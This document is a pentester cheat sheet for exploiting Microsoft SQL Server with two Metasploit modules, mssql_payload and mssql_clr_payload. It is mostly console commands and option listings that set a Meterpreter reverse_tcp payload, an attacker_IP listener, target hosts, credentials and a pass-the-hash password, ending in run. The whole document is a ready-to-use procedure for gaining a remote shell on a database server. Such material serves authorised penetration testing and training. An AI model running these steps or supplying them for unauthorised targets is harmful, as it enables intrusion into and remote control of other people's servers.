# Metasploit

Execute `meterpreter` payload for initial access

```
msf > use exploit/windows/mssql/mssql_payload

msf exploit(windows/mssql/mssql_payload) > set payload windows/x64/meterpreter/reverse_tcp

msf exploit(windows/mssql/mssql_payload) > options

Module options (exploit/windows/mssql/mssql_payload):

   Name                 Current Setting  Required  Description
   ----                 ---------------  --------  -----------
   METHOD               cmd              yes       Which payload delivery method to use (ps, cmd, or old)
   SSL                  false            no        Negotiate SSL for incoming connections
   SSLCert                               no        Path to a custom SSL certificate (default is randomly generated)
   URIPATH                               no        The URI to use for this exploit (default is random)
   USE_WINDOWS_AUTHENT  false            yes       Use windows authentication (requires DOMAIN option set)


   When CMDSTAGER::FLAVOR is one of auto,tftp,wget,curl,fetch,lwprequest,psh_invokewebrequest,ftp_http:

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all address
                                       es.
   SRVPORT  8080             yes       The local port to listen on.


   Used when making a new connection via RHOSTS:

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   DATABASE  MSSQL            no        The database to authenticate against
   PASSWORD                   no        The password for the specified username
   RHOSTS                     no        The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT     1433             no        The target port (TCP)
   USERNAME  MSSQL            no        The username to authenticate as


   Used when connecting via an existing SESSION:

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   no        The session to run this module on


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.0.2.15        yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic



View the full module info with the info, or info -d command.

msf6 exploit(windows/mssql/mssql_payload) > set lhost <attacker_IP>

msf exploit(windows/mssql/mssql_payload) > set lport <listener_PORT>

msf exploit(windows/mssql/mssql_payload) > set rhosts <target_IP>

msf exploit(windows/mssql/mssql_payload) > set username <username>

msf exploit(windows/mssql/mssql_payload) > set password <password | aad3b435b51404eeaad3b435b51404ee:<nt_hash>>

msf exploit(windows/mssql/mssql_payload) > set method <ps | cmd | old>

msf exploit(windows/mssql/mssql_payload) > run
```

Executing a CLR assmebly payload to retrieve a callback shell connection

```
msf > use exploit/windows/mssql/mssql_clr_payload

msf exploit(windows/mssql/mssql_clr_payload) > set payload windows/x64/meterpreter/reverse_tcp

msf exploit(windows/mssql/mssql_clr_payload) > options

Module options (exploit/windows/mssql/mssql_clr_payload):

   Name                 Current Setting  Required  Description
   ----                 ---------------  --------  -----------
   DATABASE             master           yes       The database to load the CLR Assembly into.
   PASSWORD                              no        The password for the specified username
   RHOSTS                                yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT                1433             yes       The target port (TCP)
   TDSENCRYPTION        false            yes       Use TLS/SSL for TDS data "Force Encryption"
   USERNAME             sa               no        The username to authenticate as
   USE_WINDOWS_AUTHENT  false            yes       Use windows authentification (requires DOMAIN option set)


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST                      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf exploit(windows/mssql/mssql_clr_payload) > set lhost <attacker_IP>

msf exploit(windows/mssql/mssql_clr_payload) > set lport <listener_PORT>

msf exploit(windows/mssql/mssql_clr_payload) > set rhosts <target_IP>

msf exploit(windows/mssql/mssql_clr_payload) > set username <username>

msf exploit(windows/mssql/mssql_clr_payload) > set password <password>

msf exploit(windows/mssql/mssql_clr_payload) > set database <database>

msf exploit(windows/mssql/mssql_clr_payload) > run
```

---
## References

- [Hacking Articles: MSSQL for Pentester Command Execution with XP_CmdShell](https://www.hackingarticles.in/mssql-for-pentester-command-execution-with-xp_cmdshell/)

- [Hacking Articles: MSSQL for Pentester Metaspoit](https://www.hackingarticles.in/mssql-for-pentester-metasploit/)